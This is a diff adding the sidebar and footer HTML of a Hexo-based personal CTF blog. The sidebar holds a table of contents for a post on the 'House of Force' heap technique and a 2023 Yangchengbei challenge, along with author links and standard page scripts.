+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#House-of-force"><span class="nav-number">1.</span> <span class="nav-text">House of force</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">条件：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="nav-number">1.2.</span> <span class="nav-text">原理：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E7%A0%81"><span class="nav-number">1.3.</span> <span class="nav-text">源码:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="nav-number">1.4.</span> <span class="nav-text">利用：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9Beasy-force"><span class="nav-number">1.5.</span> <span class="nav-text">例题：2023 羊城杯决赛easy_force</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#main%EF%BC%9A"><span class="nav-number">1.5.1.</span> <span class="nav-text">main：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#add"><span class="nav-number">1.5.2.</span> <span class="nav-text">add:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%EF%BC%9A"><span class="nav-number">1.5.3.</span> <span class="nav-text">保护：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="nav-number">1.5.4.</span> <span class="nav-text">思路：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%EF%BC%9A"><span class="nav-number">1.5.5.</span> <span class="nav-text">解题：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A6%96%E5%85%88%E9%80%9A%E8%BF%87mmap%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="nav-number">1.5.5.1.</span> <span class="nav-text">首先通过mmap泄露libc基地址：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9topchunk-size"><span class="nav-number">1.5.5.2.</span> <span class="nav-text">修改topchunk  size:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB%E7%A7%BB%E5%8A%A8top-chunk%E5%88%B0%E6%96%B0%E4%BD%8D%E7%BD%AE"><span class="nav-number">1.5.5.3.</span> <span class="nav-text">计算偏移移动top chunk到新位置:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%85%A5system%EF%BC%9A"><span class="nav-number">1.5.5.4.</span> <span class="nav-text">写入system：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-number">1.5.5.5.</span> <span class="nav-text">exp:</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="nav-number">1.6.</span> <span class="nav-text">总结：</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rjc"
+      src="/images/tou.jpg">
+  <p class="site-author-name" itemprop="name">rjc</p>
+  <div class="site-description" itemprop="description">pangpangpang</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/rjcnb666" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;rjcnb666" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2858052971@qq.com" title="E-Mail → mailto:2858052971@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+ 
+        
+        
+          <!-- 公告模块 -->
+<div class="sidebar-module">
+  <!-- 模块标题 -->
+  <h3 class="sidebar-title">
+    <i class="fa fa-bullhorn"></i> 最新公告
+  </h3>
+  <!-- 模块内容 -->
+  <div class="sidebar-content">
+    <p>🎉 欢迎光临！！！这里是pwn学弟的个人博客！！！让我们一起pangpangpang！！！！</p>
+    <p>😊 "当你心情郁闷的时候，用手托腮就好了，手臂会因为帮上忙而开心的。" 😊</p>
+    <p>👉 2858052971@qq.com </p>
+    
+    <!-- 支持 HTML 标签，比如添加链接 -->
+    <p>更多信息：<a href="/about/" target="_blank">关于本站</a></p>
+  </div>
+</div>
+        
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rjc</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":250,"height":250},"mobile":{"show":true}});</script></body>
+</html>
